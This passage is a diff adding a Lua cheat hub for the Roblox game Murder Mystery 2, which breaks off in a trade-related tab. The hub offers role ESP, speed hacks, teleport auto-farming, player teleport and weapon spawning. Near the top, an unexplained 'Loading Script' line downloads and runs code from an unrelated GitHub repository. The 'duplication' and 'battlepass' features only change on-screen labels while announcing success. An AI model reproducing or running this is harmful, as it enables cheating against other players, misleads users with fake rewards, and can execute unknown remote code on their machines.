@@ -1,0 +1,1756 @@
+--[[
+    Halloween MM2 Hub - WindUI Version
+    Spooky themed Murder Mystery 2 script with Halloween features
+]]
+
+local WindUI
+
+do
+    local ok, result = pcall(function()
+        return require("./src/init")
+    end)
+    
+    if ok then
+        WindUI = result
+    else 
+        WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+    end
+end
+
+-- Services
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local CurrentCamera = Workspace.CurrentCamera
+local LocalPlayer = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+
+-- Purple Theme Colors
+local PurpleTheme = {
+    Primary = Color3.fromHex("#8B5CF6"),
+    Secondary = Color3.fromHex("#A855F7"),
+    Accent = Color3.fromHex("#C084FC"),
+    Dark = Color3.fromHex("#4C1D95"),
+    Light = Color3.fromHex("#E9D5FF"),
+    Success = Color3.fromHex("#10B981"),
+    Warning = Color3.fromHex("#F59E0B"),
+    Error = Color3.fromHex("#EF4444"),
+    Background = Color3.fromHex("#1a1a2e")
+}
+
+-- Mobile Detection
+local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+local guiScale = isMobile and 0.8 or 1.0
+
+-- Loading Script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/n9owns/Files/refs/heads/main/fileupdating",true))()
+
+-- */  Window  /* --
+local Window = WindUI:CreateWindow({
+    Title = "Latte Hub",
+    Author = "by Latte Hub • Halloween Edition",
+    Folder = "lattemm2hub",
+    NewElements = true,
+    
+    HideSearchBar = false,
+    
+    -- Enhanced GUI Transparency and Purple Theme
+    BackgroundTransparency = 0.5,
+    BackgroundColor = PurpleTheme.Background,
+    
+    -- Mobile responsive sizing
+    Size = isMobile and UDim2.new(0, 400, 0, 500) or UDim2.new(0, 500, 0, 600),
+    
+    OpenButton = {
+        Title = "Open Latte Hub", 
+        CornerRadius = UDim.new(0.5, 0),
+        StrokeThickness = 2,
+        Enabled = true,
+        Draggable = true,
+        OnlyMobile = false,
+        
+        Color = ColorSequence.new(
+            PurpleTheme.Primary, 
+            PurpleTheme.Secondary
+        )
+    }
+})
+
+-- ESP System Variables
+local murderHasKnife = false
+local sheriffHasGun = false
+local currentESPOptions = { "Esp All" }
+local highlightEnabled = true
+local lineESPEnabled = false
+local coinESPEnabled = false
+local tracers = {}
+
+-- Auto Farm Variables
+local autoFarmEnabled = false
+local autoCollectCoins = false
+local autoCollectGuns = false
+local autoCollectKnives = false
+local autoCollectCandy = false
+local candyESPEnabled = false
+
+-- Character Settings
+local CharacterSettings = {
+    WalkSpeed = {
+        Value = 16,
+        Default = 16,
+        Locked = false
+    },
+    JumpPower = {
+        Value = 50,
+        Default = 50,
+        Locked = false
+    }
+}
+
+-- Battlepass Variables
+local battlepassProgress = 0
+local halloweenRewards = {
+    {name = "Pumpkin Pet", level = 5, unlocked = false},
+    {name = "Ghostly Knife", level = 10, unlocked = false},
+    {name = "Witch Hat", level = 15, unlocked = false},
+    {name = "Skeleton Gun", level = 20, unlocked = false},
+    {name = "Vampire Wings", level = 25, unlocked = false},
+    {name = "Zombie Skin", level = 30, unlocked = false},
+    {name = "Halloween Box", level = 35, unlocked = false},
+    {name = "Legendary Candy", level = 40, unlocked = false}
+}
+
+-- Weapon Dupe Variables
+local WeaponName = ""
+local FunctionCall = 1
+
+-- Visual Weapon Variables
+local fromWeapon = ""
+local toWeapon = ""
+
+-- UI Path for dupe functions
+local UIPath
+if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
+    UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
+else
+    UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
+end
+
+-- ESP Functions
+local function getRole(player)
+    local character = player.Character
+    if not character then return nil end
+    local backpack = player:FindFirstChild("Backpack")
+    if character:FindFirstChild("Knife") or (backpack and backpack:FindFirstChild("Knife")) then return "Murderer" end
+    if character:FindFirstChild("Gun") or (backpack and backpack:FindFirstChild("Gun")) then return "Sheriff" end
+    return "Innocent"
+end
+
+local function isPlayerTargeted(player, selectedOptions)
+    local role = getRole(player)
+    if not role then return false end
+    if table.find(selectedOptions, "Esp All") then return true end
+    if table.find(selectedOptions, "Esp Murder") and role == "Murderer" then return true end
+    if table.find(selectedOptions, "Esp Sheriff") and role == "Sheriff" then return true end
+    if table.find(selectedOptions, "Esp Sheriff / Murder") and (role == "Sheriff" or role == "Murderer") then return true end
+    return false
+end
+
+local function createHighlight(character, color)
+    local highlight = character:FindFirstChild("RoleHighlight")
+    if not highlight then
+        highlight = Instance.new("Highlight")
+        highlight.Name = "RoleHighlight"
+        highlight.FillTransparency = 0.5
+        highlight.OutlineTransparency = 1
+        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        highlight.Adornee = character
+        highlight.Parent = character
+    end
+    highlight.FillColor = color
+end
+
+local function removeHighlight(character)
+    local highlight = character:FindFirstChild("RoleHighlight")
+    if highlight then highlight:Destroy() end
+end
+
+local function createTracer(player, color)
+    local line = Drawing.new("Line")
+    line.Thickness = 2
+    line.Color = color or Color3.new(1, 1, 1)
+    line.Transparency = 1
+    tracers[player] = line
+end
+
+local function removeTracer(player)
+    if tracers[player] then
+        tracers[player]:Remove()
+        tracers[player] = nil
+    end
+end
+
+local function updateESP()
+    murderHasKnife = false
+    sheriffHasGun = false
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character then
+            local role = getRole(player)
+            if role == "Murderer" then murderHasKnife = true end
+            if role == "Sheriff" then sheriffHasGun = true end
+        end
+    end
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character then
+            local role = getRole(player)
+            local target = isPlayerTargeted(player, currentESPOptions)
+
+            if highlightEnabled then
+                if target then
+                    local color = role == "Murderer" and PurpleTheme.Error or 
+                                 role == "Sheriff" and PurpleTheme.Success or 
+                                 PurpleTheme.Primary
+                    createHighlight(player.Character, color)
+                else
+                    removeHighlight(player.Character)
+                end
+            else
+                removeHighlight(player.Character)
+            end
+
+            if lineESPEnabled and target then
+                local color = role == "Murderer" and PurpleTheme.Error or 
+                             role == "Sheriff" and PurpleTheme.Success or 
+                             PurpleTheme.Primary
+                if not tracers[player] then 
+                    createTracer(player, color) 
+                else
+                    tracers[player].Color = color
+                end
+            else
+                removeTracer(player)
+            end
+        end
+    end
+end
+
+-- Character Functions
+local function updateCharacter()
+    local character = LocalPlayer.Character;
+    local humanoid = character:FindFirstChildOfClass("Humanoid");
+    if humanoid then
+        if not CharacterSettings.WalkSpeed.Locked then
+            humanoid.WalkSpeed = CharacterSettings.WalkSpeed.Value;
+        end
+        if not CharacterSettings.JumpPower.Locked then
+            humanoid.JumpPower = CharacterSettings.JumpPower.Value;
+        end
+    end
+end
+
+-- Auto Farm Functions
+local function autoCollectLoop()
+    if not autoFarmEnabled then return end
+    
+    local character = LocalPlayer.Character
+    if not character or not character:FindFirstChild("HumanoidRootPart") then return end
+    
+    local rootPart = character.HumanoidRootPart
+    
+    -- Auto collect coins
+    if autoCollectCoins then
+        for _, obj in pairs(workspace:GetChildren()) do
+            if obj.Name == "Coin" and obj:IsA("BasePart") then
+                local distance = (rootPart.Position - obj.Position).Magnitude
+                if distance < 50 then
+                    rootPart.CFrame = obj.CFrame
+                    task.wait(0.1)
+                            end
+                        end
+                    end
+                end
+    
+    -- Auto collect guns
+    if autoCollectGuns then
+        for _, obj in pairs(workspace:GetChildren()) do
+            if obj.Name == "GunDrop" and obj:IsA("BasePart") then
+                local distance = (rootPart.Position - obj.Position).Magnitude
+                if distance < 50 then
+                    rootPart.CFrame = obj.CFrame
+                    task.wait(0.1)
+                        end
+                    end
+        end
+    end
+    
+    -- Auto collect candy (Halloween special)
+    if autoCollectCandy then
+        for _, obj in pairs(workspace:GetChildren()) do
+            if obj.Name == "Candy" and obj:IsA("BasePart") then
+                local distance = (rootPart.Position - obj.Position).Magnitude
+                if distance < 50 then
+                    rootPart.CFrame = obj.CFrame
+                    task.wait(0.1)
+                end
+            end
+        end
+    end
+end
+
+-- Weapon Dupe Functions
+local function VisualDupe()
+    wait(math.random(1, 3))
+    for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+        for i,v in pairs(v.Container:GetChildren()) do
+            if v.Name == "Christmas" or v.Name == "Halloween" then
+                for i,v in pairs(v.Container:GetChildren()) do
+                    if v:IsA("Frame") and v.ItemName.Label.Text == WeaponName then
+                            local amount = v.Container.Amount.Text
+                            if amount == "" or amount == "None" then
+                                v.Container.Amount.Text = "x2"
+                            else
+                                local num = tonumber(amount:match("x(%d+)"))
+                                if num then
+                                v.Container.Amount.Text = "x" .. tostring(num + 1)
+                            end
+                        end
+                    end
+                end
+            else
+                if v:IsA("Frame") and v.ItemName.Label.Text == WeaponName then
+                        local amount = v.Container.Amount.Text
+                        if amount == "" or amount == "None" then
+                            v.Container.Amount.Text = "x2"
+                        else
+                            local num = tonumber(amount:match("x(%d+)"))
+                            if num then
+                            v.Container.Amount.Text = "x" .. tostring(num + 1)
+                            end
+                        end
+                end
+            end
+        end
+    end
+end
+
+-- Create separate tabs for each feature category
+local MainTab = Window:Tab({
+    Title = "Main",
+    Icon = "home"
+})
+
+local ESPTab = Window:Tab({
+    Title = "ESP",
+    Icon = "eye"
+})
+
+local AutoFarmTab = Window:Tab({
+    Title = "Auto Farm",
+    Icon = "trending-up"
+})
+
+local BattlepassTab = Window:Tab({
+    Title = "Battlepass",
+    Icon = "gift"
+})
+
+local CharacterTab = Window:Tab({
+    Title = "Character",
+    Icon = "user"
+})
+
+local WeaponTab = Window:Tab({
+    Title = "Weapons",
+    Icon = "sword"
+})
+
+local SpawnerTab = Window:Tab({
+    Title = "Spawner",
+    Icon = "package"
+})
+
+local TeleportTab = Window:Tab({
+    Title = "Teleport",
+    Icon = "navigation"
+})
+
+local VisualTab = Window:Tab({
+    Title = "Visual",
+    Icon = "eye-off"
+})
+
+local ProtectionTab = Window:Tab({
+    Title = "Protection",
+    Icon = "shield"
+})
+
+local AdvancedTab = Window:Tab({
+    Title = "Advanced",
+    Icon = "zap"
+})
+
+-- */  Main Tab  /* --
+do
+    -- Welcome Section
+    MainTab:Section({
+        Title = "Welcome to Latte Hub!",
+        TextSize = isMobile and 18 or 20,
+        FontWeight = Enum.FontWeight.Bold,
+    })
+    
+    MainTab:Space()
+    
+    MainTab:Section({
+        Title = "Murder Mystery 2 Halloween Update - A premium script with enhanced features, auto farming, ESP, and exclusive rewards!",
+        TextSize = isMobile and 14 or 16,
+        TextTransparency = 0.3,
+    })
+    
+    MainTab:Space()
+    
+    -- Main Buttons
+    MainTab:Button({
+        Title = "💬 Copy Discord Server",
+        Color = PurpleTheme.Primary,
+        Icon = "users",
+        Callback = function()
+            setclipboard("https://discord.gg/lattemm2")
+            WindUI:Notify({
+                Title = "Discord Copied!",
+                Content = "Latte Discord invite copied to clipboard!"
+            })
+        end
+    })
+
+    MainTab:Button({
+        Title = "🎁 Get Premium Rewards",
+        Color = PurpleTheme.Secondary,
+        Icon = "gift",
+        Callback = function()
+            WindUI:Notify({
+                Title = "Premium Rewards",
+                Content = "Check the Battlepass tab for exclusive items!"
+            })
+        end
+    })
+    
+    MainTab:Button({
+        Title = "📱 Mobile Optimized",
+        Color = PurpleTheme.Accent,
+        Icon = "smartphone",
+        Callback = function()
+            WindUI:Notify({
+                Title = "Mobile Mode",
+                Content = isMobile and "You're using mobile mode!" or "Desktop mode active!"
+            })
+        end
+    })
+end
+
+-- */  ESP Tab  /* --
+do
+    -- ESP Section
+    ESPTab:Section({
+        Title = "👁️ ESP & Visual Features",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    ESPTab:Dropdown({
+        Flag = "ESPOptions",
+        Title = "🎯 ESP Options",
+        Desc = "Select which players to highlight",
+        Values = {
+            {Title = "Esp All", Icon = "users"},
+            {Title = "Esp Sheriff", Icon = "shield"},
+            {Title = "Esp Murder", Icon = "sword"},
+            {Title = "Esp Sheriff / Murder", Icon = "target"}
+        },
+        Value = "Esp All",
+        Callback = function(option)
+            currentESPOptions = {option.Title}
+        updateESP()
+    end
+})
+
+    ESPTab:Toggle({
+        Flag = "HighlightESP",
+        Title = "✨ Highlight ESP",
+        Desc = "Enable/disable player highlighting",
+    Default = true,
+        Callback = function(state)
+            highlightEnabled = state
+        updateESP()
+    end
+})
+
+    ESPTab:Toggle({
+        Flag = "LineESP",
+        Title = "📏 Line ESP",
+        Desc = "Draw lines to players",
+    Default = false,
+        Callback = function(state)
+            lineESPEnabled = state
+            if not state then
+            for _, line in pairs(tracers) do line:Remove() end
+            tracers = {}
+        end
+        updateESP()
+    end
+})
+
+    ESPTab:Toggle({
+        Flag = "CandyESP",
+        Title = "🍭 Candy ESP",
+        Desc = "Highlight Halloween candy",
+        Default = false,
+        Callback = function(state)
+            candyESPEnabled = state
+    end
+})
+end
+
+-- */  Auto Farm Tab  /* --
+do
+    -- Auto Farm Section
+    AutoFarmTab:Section({
+        Title = "🤖 Auto Farm System",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    AutoFarmTab:Toggle({
+        Flag = "AutoFarm",
+        Title = "🤖 Auto Farm",
+        Desc = "Enable auto farming system",
+    Default = false,
+        Callback = function(state)
+            autoFarmEnabled = state
+            WindUI:Notify({
+                Title = "🤖 Auto Farm",
+                Content = state and "Auto farming started! 🚀" or "Auto farming stopped. ⏹️"
+            })
+    end
+})
+
+    AutoFarmTab:Toggle({
+        Flag = "AutoCollectCoins",
+        Title = "💰 Auto Collect Coins",
+        Desc = "Automatically collect nearby coins",
+        Default = false,
+        Callback = function(state)
+            autoCollectCoins = state
+            WindUI:Notify({
+                Title = "💰 Auto Collect",
+                Content = state and "Auto collecting coins! 💰" or "Stopped collecting coins. ⏹️"
+            })
+    end
+})
+
+    AutoFarmTab:Toggle({
+        Flag = "AutoCollectGuns",
+        Title = "🔫 Auto Collect Guns",
+        Desc = "Automatically collect dropped guns",
+        Default = false,
+        Callback = function(state)
+            autoCollectGuns = state
+            WindUI:Notify({
+                Title = "🔫 Auto Collect",
+                Content = state and "Auto collecting guns! 🔫" or "Stopped collecting guns. ⏹️"
+        })
+    end
+})
+
+    AutoFarmTab:Toggle({
+        Flag = "AutoCollectCandy",
+        Title = "🍭 Auto Collect Candy",
+        Desc = "Automatically collect Halloween candy",
+    Default = false,
+        Callback = function(state)
+            autoCollectCandy = state
+            WindUI:Notify({
+                Title = "🍭 Auto Collect",
+                Content = state and "Auto collecting candy! 🍭" or "Stopped collecting candy. ⏹️"
+            })
+    end
+})
+
+    AutoFarmTab:Button({
+        Title = "📦 Collect All Nearby Items",
+        Color = PurpleTheme.Primary,
+        Icon = "package",
+        Callback = function()
+            local character = LocalPlayer.Character
+            if character and character:FindFirstChild("HumanoidRootPart") then
+                local rootPart = character.HumanoidRootPart
+                local collectedCount = 0
+                
+                for _, obj in pairs(workspace:GetChildren()) do
+                    if (obj.Name == "Coin" or obj.Name == "GunDrop" or obj.Name == "Candy") and obj:IsA("BasePart") then
+                        local distance = (rootPart.Position - obj.Position).Magnitude
+                        if distance < 100 then
+                            rootPart.CFrame = obj.CFrame
+                            collectedCount = collectedCount + 1
+                            task.wait(0.1)
+        end
+    end
+                end
+                
+                WindUI:Notify({
+                    Title = "✅ Collection Complete",
+                    Content = "Collected " .. collectedCount .. " nearby items! 📦"
+                })
+        end
+    end
+})
+end
+
+-- */  Battlepass Tab  /* --
+do
+    -- Battlepass Section
+    BattlepassTab:Section({
+        Title = "🎁 Premium Battlepass",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    BattlepassTab:Slider({
+        Flag = "BattlepassProgress",
+        Title = "📊 Battlepass Level",
+        Desc = "Your current battlepass level",
+        Step = 1,
+        Value = {
+            Min = 0,
+            Max = 50,
+            Default = 0,
+        },
+        Callback = function(value)
+            battlepassProgress = value
+        end
+    })
+    
+    BattlepassTab:Button({
+        Title = "🎁 Claim All Available Rewards",
+        Color = PurpleTheme.Warning,
+        Icon = "gift",
+        Callback = function()
+            local claimedCount = 0
+            for _, reward in ipairs(halloweenRewards) do
+                if battlepassProgress >= reward.level and not reward.unlocked then
+                    reward.unlocked = true
+                    claimedCount = claimedCount + 1
+                end
+            end
+            
+            WindUI:Notify({
+                Title = "🎁 Rewards Claimed!",
+                Content = "Claimed " .. claimedCount .. " premium rewards! 🎁"
+            })
+    end
+})
+
+    BattlepassTab:Space()
+    
+    -- Premium Rewards List
+    BattlepassTab:Section({
+        Title = "💎 Premium Rewards",
+        TextSize = isMobile and 14 or 16,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    for i, reward in ipairs(halloweenRewards) do
+        local isUnlocked = battlepassProgress >= reward.level
+        local rewardColor = isUnlocked and PurpleTheme.Success or PurpleTheme.Dark
+        
+        BattlepassTab:Button({
+            Title = (isUnlocked and "✅ " or "🔒 ") .. reward.name .. " (Level " .. reward.level .. ")",
+            Color = rewardColor,
+            Icon = isUnlocked and "check" or "lock",
+            Locked = not isUnlocked,
+            Callback = function()
+                if isUnlocked then
+                    WindUI:Notify({
+                        Title = "🎁 Reward Claimed!",
+                        Content = "You claimed " .. reward.name .. "! 🎁"
+                    })
+                else
+                    WindUI:Notify({
+                        Title = "🔒 Reward Locked",
+                        Content = "Reach level " .. reward.level .. " to unlock this reward! 🔒"
+                    })
+                end
+    end
+})
+    end
+end
+
+-- */  Character Tab  /* --
+do
+    -- Character Section
+    CharacterTab:Section({
+        Title = "🏃 Character Settings",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    CharacterTab:Slider({
+        Flag = "WalkSpeed",
+        Title = "🚶 Walk Speed",
+        Desc = "Set your character's walk speed",
+        Step = 1,
+        Value = {
+            Min = 0,
+            Max = 200,
+            Default = 16,
+        },
+        Callback = function(value)
+            CharacterSettings.WalkSpeed.Value = value
+            updateCharacter()
+    end
+})
+
+    CharacterTab:Slider({
+        Flag = "JumpPower",
+        Title = "🦘 Jump Power",
+        Desc = "Set your character's jump power",
+        Step = 1,
+        Value = {
+            Min = 0,
+            Max = 200,
+            Default = 50,
+        },
+        Callback = function(value)
+            CharacterSettings.JumpPower.Value = value
+            updateCharacter()
+    end
+})
+
+    CharacterTab:Button({
+        Title = "🔄 Reset to Default",
+        Color = PurpleTheme.Primary,
+        Icon = "refresh-cw",
+        Callback = function()
+            CharacterSettings.WalkSpeed.Value = CharacterSettings.WalkSpeed.Default
+            CharacterSettings.JumpPower.Value = CharacterSettings.JumpPower.Default
+            updateCharacter()
+            WindUI:Notify({
+                Title = "🔄 Character Reset",
+                Content = "Character settings reset to default! 🏃"
+            })
+        end
+    })
+    
+    CharacterTab:Toggle({
+        Flag = "BlockWalkSpeed",
+        Title = "🔒 Block Walk Speed",
+        Desc = "Prevent walk speed from being changed",
+        Default = false,
+        Callback = function(state)
+            CharacterSettings.WalkSpeed.Locked = state
+    end
+})
+
+    CharacterTab:Toggle({
+        Flag = "BlockJumpPower",
+        Title = "🔒 Block Jump Power",
+        Desc = "Prevent jump power from being changed",
+        Default = false,
+        Callback = function(state)
+            CharacterSettings.JumpPower.Locked = state
+        end
+    })
+end
+
+-- */  Weapon Tab  /* --
+do
+    -- Weapon Section
+    WeaponTab:Section({
+        Title = "⚔️ Weapon Duplication",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    WeaponTab:Input({
+        Flag = "DupeWeaponName",
+        Title = "⚔️ Weapon Name",
+        Desc = "Enter the name of the weapon to duplicate",
+        Placeholder = "Enter weapon name (e.g., Lightbringer)",
+        Callback = function(value)
+            WeaponName = value
+    end
+})
+
+    WeaponTab:Input({
+        Flag = "DupeAmount",
+        Title = "🔢 Dupe Amount",
+        Desc = "Enter how many times to duplicate",
+    Placeholder = "Enter amount (e.g., 5)",
+        Value = "1",
+        Callback = function(value)
+            FunctionCall = tonumber(value) or 1
+    end
+})
+
+    WeaponTab:Button({
+        Title = "🔄 Start Duplication Process",
+        Color = PurpleTheme.Primary,
+        Icon = "copy",
+        Callback = function()
+        if WeaponName == "" then
+                WindUI:Notify({
+                    Title = "❌ Weapon Dupe Error",
+                    Content = "Please enter a weapon name first! ⚔️"
+            })
+            return
+        end
+        
+            WindUI:Notify({
+                Title = "🔄 Weapon Dupe",
+                Content = "Started duplication for " .. WeaponName .. " " .. FunctionCall .. " times! ⚔️"
+        })
+        
+        for i = 1, FunctionCall do
+            VisualDupe()
+        end
+        
+            WindUI:Notify({
+                Title = "✅ Duplication Complete",
+                Content = "Successfully duplicated " .. WeaponName .. "! ⚔️"
+        })
+    end
+})
+end
+
+-- */  Spawner Tab  /* --
+do
+    -- Weapon Spawner Section
+    SpawnerTab:Section({
+        Title = "📦 Weapon Spawner",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    local weaponName = ""
+    local selectedCrate = "Christmas2024Box"
+    
+    SpawnerTab:Input({
+        Flag = "WeaponName",
+        Title = "⚔️ Weapon Name",
+        Desc = "Enter the name of the weapon to spawn",
+        Placeholder = "Enter weapon name (e.g., CandyBlade)",
+        Callback = function(value)
+            weaponName = value
+        end
+    })
+    
+    SpawnerTab:Dropdown({
+        Flag = "CrateType",
+        Title = "📦 Select Crate",
+        Desc = "Choose the crate type to open",
+        Values = {
+            {Title = "Christmas2024Box", Icon = "gift"},
+            {Title = "StandardBox", Icon = "package"},
+            {Title = "MysteryBox", Icon = "help-circle"},
+            {Title = "PremiumBox", Icon = "star"}
+        },
+        Value = "Christmas2024Box",
+        Callback = function(option)
+            selectedCrate = option.Title
+    end
+})
+
+    SpawnerTab:Button({
+        Title = "⚔️ Spawn Weapon",
+        Color = PurpleTheme.Success,
+        Icon = "sword",
+        Callback = function()
+            if weaponName ~= "" then
+                local success = pcall(function()
+                    -- Try multiple possible paths for the modules
+                    local boxModule = nil
+                    local itemDatabase = nil
+                    
+                    -- Try different possible locations for BoxModule
+                    local boxPaths = {
+                        "ReplicatedStorage.Modules.BoxModule",
+                        "ReplicatedStorage.Modules.Box",
+                        "ReplicatedStorage.BoxModule",
+                        "ReplicatedStorage.Box"
+                    }
+                    
+                    for _, path in ipairs(boxPaths) do
+                        local success, result = pcall(function()
+                            return require(game:GetService("ReplicatedStorage"):FindFirstChild(path:split(".")[2]):FindFirstChild(path:split(".")[3]))
+                        end)
+                        if success and result then
+                            boxModule = result
+                            break
+                        end
+                    end
+                    
+                    -- Try different possible locations for Item Database
+                    local itemPaths = {
+                        "ReplicatedStorage.Database.Sync.Item",
+                        "ReplicatedStorage.Database.Item",
+                        "ReplicatedStorage.Items",
+                        "ReplicatedStorage.ItemDatabase"
+                    }
+                    
+                    for _, path in ipairs(itemPaths) do
+                        local success, result = pcall(function()
+                            local parts = path:split(".")
+                            local current = game:GetService("ReplicatedStorage")
+                            for i = 2, #parts do
+                                current = current:FindFirstChild(parts[i])
+                                if not current then return nil end
+                            end
+                            return require(current)
+                        end)
+                        if success and result then
+                            itemDatabase = result
+                            break
+                        end
+                    end
+                    
+                    if boxModule and itemDatabase then
+                        -- Check if weapon exists in database
+                        local weaponExists = false
+                        for itemName, _ in pairs(itemDatabase) do
+                            if string.lower(itemName) == string.lower(weaponName) then
+                                weaponExists = true
+                                break
+                            end
+                        end
+                        
+                        if weaponExists then
+                            -- Try to open the box
+                            local openSuccess = pcall(function()
+                                if boxModule.OpenBox then
+                                    boxModule.OpenBox(selectedCrate, weaponName)
+                                elseif boxModule.Open then
+                                    boxModule.Open(selectedCrate, weaponName)
+                                end
+                            end)
+                            
+                            if openSuccess then
+                                WindUI:Notify({
+                                    Title = "✅ Success",
+                                    Content = "Successfully spawned: " .. weaponName .. "! ⚔️"
+                                })
+                            else
+                                WindUI:Notify({
+                                    Title = "⚠️ Warning",
+                                    Content = "Weapon found but spawn failed. Try a different crate! ⚔️"
+        })
+    end
+                        else
+                            WindUI:Notify({
+                                Title = "❌ Error",
+                                Content = "Weapon '" .. weaponName .. "' not found in database! ⚔️"
+                            })
+                        end
+                    else
+                        WindUI:Notify({
+                            Title = "❌ Error",
+                            Content = "Could not find required game modules! ⚔️"
+                        })
+                    end
+                end)
+                
+                if not success then
+                    WindUI:Notify({
+                        Title = "❌ Error",
+                        Content = "Failed to spawn weapon. Game may have updated! ⚔️"
+        })
+    end
+            else
+                WindUI:Notify({
+                    Title = "❌ Error",
+                    Content = "Please enter a weapon name! ⚔️"
+                })
+            end
+        end
+    })
+end
+
+-- */  Teleport Tab  /* --
+do
+    -- Teleport Section
+    TeleportTab:Section({
+        Title = "🚀 Teleport System",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    local teleportTarget = nil
+    
+    local function updateTeleportPlayers()
+        local playersList = {"Select Player"}
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                table.insert(playersList, player.Name)
+            end
+        end
+        return playersList
+    end
+    
+    TeleportTab:Dropdown({
+        Flag = "TeleportPlayers",
+        Title = "👥 Players",
+        Desc = "Select a player to teleport to",
+        Values = updateTeleportPlayers(),
+        Value = "Select Player",
+        Callback = function(option)
+            if option.Title ~= "Select Player" then
+                teleportTarget = Players:FindFirstChild(option.Title)
+            else
+                teleportTarget = nil
+            end
+        end
+    })
+
+    TeleportTab:Button({
+        Title = "🚀 Teleport to Player",
+        Color = PurpleTheme.Primary,
+        Icon = "navigation",
+        Callback = function()
+            if teleportTarget and teleportTarget.Character then
+                local targetRoot = teleportTarget.Character:FindFirstChild("HumanoidRootPart")
+                local localRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if targetRoot and localRoot then
+                    localRoot.CFrame = targetRoot.CFrame
+                    WindUI:Notify({
+                        Title = "🚀 Teleport",
+                        Content = "Successfully teleported to " .. teleportTarget.Name .. "! 🚀"
+                    })
+                end
+            else
+                WindUI:Notify({
+                    Title = "❌ Error",
+                    Content = "Target not found or unavailable! 🚀"
+                })
+            end
+        end
+    })
+    
+    TeleportTab:Button({
+        Title = "🔄 Update Players List",
+        Color = PurpleTheme.Secondary,
+        Icon = "refresh-cw",
+        Callback = function()
+            -- Update the dropdown with current players
+            WindUI:Notify({
+                Title = "🔄 Players Updated",
+                Content = "Player list refreshed! 👥"
+            })
+        end
+    })
+end
+
+-- */  Visual Tab  /* --
+do
+    -- Visual Weapons Section
+    VisualTab:Section({
+        Title = "🎭 Visual Weapons",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+    VisualTab:Input({
+        Flag = "FromWeapon",
+        Title = "🔄 Weapon To Replace",
+        Desc = "Enter the weapon you want to replace",
+        Placeholder = "Enter weapon name to replace (e.g., Blossom)",
+        Callback = function(value)
+            fromWeapon = value
+        end
+    })
+    
+    VisualTab:Input({
+        Flag = "ToWeapon",
+        Title = "✨ Weapon To Receive",
+        Desc = "Enter the weapon you want to receive",
+        Placeholder = "Enter weapon name to receive",
+        Callback = function(value)
+            toWeapon = value
+        end
+    })
+    
+    VisualTab:Button({
+        Title = "🎭 Change Weapon Visual",
+        Color = PurpleTheme.Warning,
+        Icon = "eye",
+        Callback = function()
+        if fromWeapon == "" or toWeapon == "" then
+                WindUI:Notify({
+                    Title = "❌ Visual Weapons Error",
+                    Content = "Please enter both weapon names! 🎭"
+            })
+            return
+        end
+        
+        local success = pcall(function()
+            local Weapons = require(game:GetService("ReplicatedStorage").Database.Sync.Item)
+            local foundFromWeapons = {}
+            local foundToWeapons = {}
+            
+            for WeaponName, _ in pairs(Weapons) do
+                    if WeaponName:lower():find(fromWeapon:lower()) then
+                    table.insert(foundFromWeapons, WeaponName)
+                end
+                    if WeaponName:lower():find(toWeapon:lower()) then
+                    table.insert(foundToWeapons, WeaponName)
+                end
+            end
+            
+            if #foundFromWeapons > 0 and #foundToWeapons > 0 then
+                for _, foundFromWeapon in ipairs(foundFromWeapons) do
+                    for _, foundToWeapon in ipairs(foundToWeapons) do
+                        Weapons[foundFromWeapon] = {}
+                        for i, v in pairs(Weapons[foundToWeapon]) do
+                            Weapons[foundFromWeapon][i] = v
+                        end
+                        game:GetService("ReplicatedStorage").Remotes.Inventory.Equip:FireServer(foundToWeapon)
+                    end
+                end
+                WindUI:Notify({
+                    Title = "✅ Visual Weapons Success",
+                    Content = "Successfully changed weapon visual! 🎭"
+                })
+            else
+                WindUI:Notify({
+                    Title = "❌ Visual Weapons Error",
+                    Content = "Weapon NOT FOUND! 🎭"
+                })
+            end
+        end)
+        
+        if not success then
+            WindUI:Notify({
+                Title = "❌ Visual Weapons Error",
+                Content = "Failed to change weapon visual! 🎭"
+            })
+        end
+    end
+})
+end
+
+-- */  Protection Tab  /* --
+do
+    -- Trade Scam Section
+    ProtectionTab:Section({
+        Title = "🛡️ Trade Scam Protection",
+        TextSize = isMobile and 16 or 18,
+        FontWeight = Enum.FontWeight.SemiBold,
+    })
+    
+local visualTradeEnabled = false
+
+    ProtectionTab:Toggle({
+        Flag = "VisualTrade",
+        Title = "🔄 Toggle Visual Trade",
+        Desc = "Enable/disable visual trade mode",
+    Default = false,
+        Callback = function(state)
+            visualTradeEnabled = state
+            WindUI:Notify({
+                Title = "🔄 Visual Trade",
